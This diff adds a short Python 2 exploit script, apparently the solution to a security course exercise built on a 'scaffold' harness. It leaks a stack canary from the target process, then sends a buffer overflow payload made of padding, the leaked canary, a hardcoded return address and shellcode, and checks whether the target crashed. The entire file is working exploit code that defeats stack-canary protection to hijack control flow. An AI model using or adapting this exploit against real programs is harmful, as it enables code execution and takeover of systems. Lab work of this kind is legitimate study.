@@ -1,0 +1,24 @@
+#!/usr/bin/env python2
+
+from scaffold import *
+
+random = "\\x22\\x22\\x11\\x"
+
+p.send(random + "\n")
+
+canary = p.recv(12)
+
+canary = canary[4:8]
+
+return_address = "\xe4\xf7\xff\xbf"
+
+random = "\x00"
+
+send_string = random * 16 + canary + random * 8 + return_address + SHELLCODE + "\n"
+
+p.send(send_string)
+
+returncode = p.end()
+
+if returncode == -11: print "segmentation fault or stack canary!"
+elif returncode != 0: print "return code", returncode
